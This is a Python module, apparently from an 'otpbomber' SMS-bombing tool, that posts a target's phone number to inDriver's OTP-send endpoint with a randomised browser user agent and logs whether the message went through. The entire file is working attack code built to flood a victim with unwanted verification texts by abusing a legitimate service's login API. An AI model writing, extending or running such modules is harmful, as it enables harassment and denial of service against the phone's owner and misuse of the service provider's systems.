from otpbomber.core import *
from otpbomber.localuseragent import *

async def indriver(phone, client, out):
    name = 'indriver'
    domain = 'indriver.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json'}
    json_data = {'phone': f'92{phone[-10:]}'}
    try:
        response = await client.post('https://indriver.com/api/v1/auth/otp/send', headers=headers, json=json_data)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})